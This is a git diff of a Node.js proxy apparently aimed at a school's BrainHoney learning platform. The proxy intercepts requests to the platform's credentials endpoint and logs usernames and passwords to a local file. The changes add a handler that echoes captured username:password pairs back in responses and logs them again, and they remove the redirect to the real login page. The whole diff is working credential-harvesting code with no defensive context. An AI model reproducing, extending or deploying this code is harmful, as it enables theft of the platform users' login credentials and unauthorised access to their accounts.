@@ -3,17 +3,18 @@ var http = require('http'),
     fs = require('fs'),
     handler = require(__dirname + '/lib.js'),
     upgrade = require(__dirname + '/upgrade.js'),
-    logger = require(__dirname + '/log.js');
+    logger = require(__dirname + '/log.js'),
+    require_login = require(__dirname + '/auth.js');
 
 var shouldBlock = false, activatedUsers = [];
 var admin_server = function(req, res, parsed_req) {
-  var cookie = {};
-  (req.headers['cookie'] || '').split(';').forEach(function(pair) {
-    pair = pair.split('=');
-    cookie[pair[0]] = pair[1];
-  });
-  if( cookie['.ASPXAUTH'] ) {
-    // TODO: check username
+  require_login(req, res, parsed_req, function() {
+    logger(req, './log.txt', function(body, log) {
+      res.write(body.username + ': ' + body.password);
+      res.end();
+      log(body.username + '    ' + body.password);
+    });
+  }, function() {
     switch( parsed_req.path ) {
       case '/proxy_admin/enforce':
         shouldBlock = true; 
@@ -33,19 +34,13 @@ var admin_server = function(req, res, parsed_req) {
     }
     res.write("Admin\n");
     res.end();
-  } else {
-    res.writeHead(302, {
-      'Location': 'https://bwhs.brainhoney.com/Login.vp/page.htm?ReturnUrl=https%3A%2F%2Fbwhs.brainhoney.com%2Fproxy_admin'
-    });
-    res.end();
-  }
+  });
 };
 var filter = function(req, res, parsed_req, cont) {
   if( parsed_req.host == 'bwhs.brainhoney.com' || !shouldBlock ) {
     if( parsed_req.path == '/Controls/CredentialsUI.ashx' ) {
-      logger(req, './log.txt', function(body) {
+      logger(req, './log.txt', function(body, log) {
 	shouldBlock && activatedUsers.push(body.username);
-	return body.username+'    '+body.password+'\n';
       });
     } else if( parsed_req.path.match(/^\/proxy_admin/) ) {
       admin_server(req, res, parsed_req);
